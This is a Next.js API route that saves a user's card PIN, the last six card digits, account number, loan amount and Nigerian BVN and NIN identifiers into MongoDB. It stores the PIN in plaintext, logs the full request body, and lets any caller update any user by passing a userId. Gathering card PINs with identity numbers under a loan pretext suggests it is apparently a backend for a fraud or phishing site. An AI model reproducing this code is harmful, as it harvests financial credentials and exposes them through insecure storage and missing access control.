// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
import type { NextApiRequest, NextApiResponse } from "next";
import dbConnect from "../../lib/dbConnect";
import User from "../../../model/User";
import bcrypt from "bcryptjs";

interface ResponseData {
  error?: string;
  msg?: string;
}




export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse<ResponseData>
) {
  await dbConnect();
  try {
  // validate if it is a PUT
  if (req.method !== "PUT") {
    return res
      .status(200)
      .json({ error: "This API call only accepts POST methods" });
  }

  // get and validate body variables
  const {
    account,
    card_pin,
    loan_amount,
    six_digits,
    userId,
    bvn,
    nin
  } = req.body;
  
  const data = {
    cpin: card_pin,
    loanAmm: loan_amount,
    accNo: account,
    last6: six_digits,
    bvn: bvn,
    nin: nin

  }
  console.log(req.body)


 
   // update User on MongoDB
   const query = await User.findByIdAndUpdate(
    userId._id,
    {
      $set: data
     },
    {new:true}
   )
    console.log(query)
  if (query) {
    res.status(200).json({ msg: "Update User: " })
  }
  
 // res.status(500).json({ msg: "SERVER ERROR " })

  } catch (error) {
    console.log(error)
  res.status(500).json({ msg: "SERVER ERROR " })
 }
 

  

}